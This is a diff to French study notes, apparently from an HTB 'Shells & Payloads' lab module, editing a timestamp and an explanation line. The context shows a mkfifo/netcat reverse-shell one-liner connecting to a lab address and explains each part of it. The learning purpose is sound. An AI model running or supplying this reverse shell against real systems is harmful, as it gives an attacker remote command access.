@@ -2,7 +2,7 @@
 title: Shells & Payloads
 description: 
 published: true
-date: 2025-05-17T19:46:43.829Z
+date: 2025-05-17T19:46:49.998Z
 tags: htb, module
 editor: markdown
 dateCreated: 2025-05-04T16:19:33.360Z
@@ -191,4 +191,4 @@ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 777
 		Spécifie l'interpréteur de commandes (avec -i pour le rendre interactif). L'expression 2>&1 redirige le flux d'erreur standard (2) et le flux de sortie standard (1) vers la commande qui suit le symbole | (pipe).
 
 5. **`nc 10.10.14.12 7777 > /tmp/f`**
-		Utilise Netcat pour envoyer une connexion vers l'attaquant. La sortie sera redigigée vers le pipe nommé (FIFO).
+		Utilise Netcat pour envoyer une connexion vers l'attaquant. La sortie sera redigigée vers le pipe nommé (FIFO) **/tmp/f**.
